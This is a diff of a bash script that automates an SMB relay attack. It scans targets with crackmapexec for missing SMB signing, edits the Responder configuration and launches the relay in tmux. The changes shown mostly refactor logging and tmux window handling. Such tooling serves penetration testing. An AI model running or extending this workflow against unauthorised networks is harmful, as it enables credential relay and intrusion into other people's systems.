@@ -38,7 +38,7 @@ cleanup() {
     local exit_code=$?
 
     if [ "$SESSION_CREATED" = true ] && [ $exit_code -ne 0 ]; then
-        echo -e "${YELLOW}[*] Cleaning up tmux session...${RESET}"
+        log "${YELLOW}[*] Cleaning up tmux session...${RESET}"
         tmux has-session -t "$session_name" 2>/dev/null && \
         tmux kill-session -t "$session_name"
     fi
@@ -71,6 +71,10 @@ banner() {
   echo -e "${RESET}"
 }       
 
+log() {
+    echo -e "$1" | tee -a "$ATTACK_LOG"
+}
+
 # Check if a tool is installed
 check_tool() {
     echo -e "[*] Checking ${YELLOW}$1${RESET} if installed..."
@@ -90,18 +94,18 @@ validate_network_interface() {
 
 # Run crackmapexec
 run_crackmapexec() {
-    echo -e "${BLUE}[*] Scanning for misconfigured SMB signing on targets...${RESET}" | tee -a "$ATTACK_LOG"
-    echo -e "${GREEN}[*] Generating list of vulnerable targets in ${TARGET_SMB_FILE}.${RESET}"
+    log "${BLUE}[*] Scanning for misconfigured SMB signing on targets...${RESET}" | tee -a "$ATTACK_LOG"
+    log "${GREEN}[*] Generating list of vulnerable targets in ${TARGET_SMB_FILE}.${RESET}"
     
     # Run crackmapexec and let it generate the relay list
     crackmapexec smb "${TARGET_FILE}" --gen-relay-list "${TARGET_SMB_FILE}" || {
-        echo -e "${RED}[!] crackmapexec failed. Exiting.${RESET}"
+        log "${RED}[!] crackmapexec failed. Exiting.${RESET}"
         exit 1
     }
     
     if [ -s "${TARGET_SMB_FILE}" ]; then
-    count=$(wc -l < "${TARGET_SMB_FILE}")
-    echo -e "${YELLOW}[+] Found $count vulnerable target(s):${RESET}"
+        count=$(wc -l < "${TARGET_SMB_FILE}")
+    log "${YELLOW}[+] Found $count vulnerable target(s):${RESET}"
     while read -r ip; do
         echo -e "${YELLOW}[!] $ip${RESET}"
     done < "${TARGET_SMB_FILE}"
@@ -140,11 +144,9 @@ start_tmux_window() {
         exit 1
     }
     
-    # Create the window in the tmux session
-    if tmux has-session -t "$session_name" 2>/dev/null; then
-        if tmux list-windows -t "$session_name" 2>/dev/null | grep -qw "$window_name"; then
-            tmux new-window -t "$session_name" -n "$window_name"
-        fi
+    # Create window if needed
+    if ! tmux list-windows -t "$session_name" 2>/dev/null | grep -qw "$window_name"; then
+        tmux new-window -t "$session_name" -n "$window_name"
     fi
     
     # Send the command to the new tmux window
@@ -154,7 +156,7 @@ start_tmux_window() {
 
 # Function to execute SMB relay attack in tmux
 run_smb_relay_attack() {
-    echo -e "${BLUE}[*] Starting SMB Relay Attack...${RESET}" | tee -a "$ATTACK_LOG"
+    log "${BLUE}[*] Starting SMB Relay Attack...${RESET}" | tee -a "$ATTACK_LOG"
 
     # Ensure tmux session exists
     if ! tmux has-session -t "$session_name" 2>/dev/null; then
@@ -273,7 +275,7 @@ check_tool "crackmapexec"
 run_crackmapexec
 
 if [ -s "${TARGET_SMB_FILE}" ]; then
-    echo -e "${GREEN}[+] Vulnerable targets found. Proceeding with SMB relay attack...${RESET}"
+    log "${GREEN}[+] Vulnerable targets found. Proceeding with SMB relay attack...${RESET}"
     edit_responder_conf
     sleep 3
     run_smb_relay_attack
